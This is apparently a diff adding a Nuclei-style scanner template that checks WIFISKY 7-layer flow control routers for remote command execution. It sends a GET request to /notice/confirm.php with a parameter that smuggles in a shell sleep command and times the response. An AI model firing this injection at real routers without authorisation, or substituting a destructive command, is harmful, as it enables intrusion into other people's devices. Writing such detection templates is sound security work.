@@ -1,0 +1,22 @@
+id: WIFISKY-7-layerFlowControlRouter-confirm-RCE
+
+info:
+  name: WIFISKY-7-layerFlowControlRouter-confirm-RCE
+  author: HuanXiong
+  severity: high
+
+  tags: RCE
+
+http:
+  - method: GET
+    raw:
+      - |
+        GET /notice/confirm.php?t=;sleep%203 HTTP/1.1
+        Host: {{Host}}
+        Accept: */*
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 3"
